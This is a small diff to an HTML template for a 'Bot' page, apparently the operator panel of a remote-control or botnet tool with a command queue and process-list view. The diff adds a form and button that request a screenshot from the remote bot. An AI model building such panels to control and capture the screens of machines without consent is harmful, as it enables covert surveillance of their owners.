@@ -28,10 +28,15 @@ Bot {{ id }}
         <input type="hidden" name="id" value="{{ id }}">
         </form>
 
+        <form action="/action/ss" method="POST" id="ss">
+        <input type="hidden" name="id" value="{{ id }}">
+        </form>
+
         <div class="btn-group">
             <button type="submit" form="info" value="Submit">Update Info</button>
             <button type="submit" form="ps" value="Submit">Update Process List</button>
             <button type="submit" form="clear" value="Submit">Clear command queue</button>
+            <button type="submit" form="ss" value="Submit">Screenshot</button>
         </div>
     </div>
 
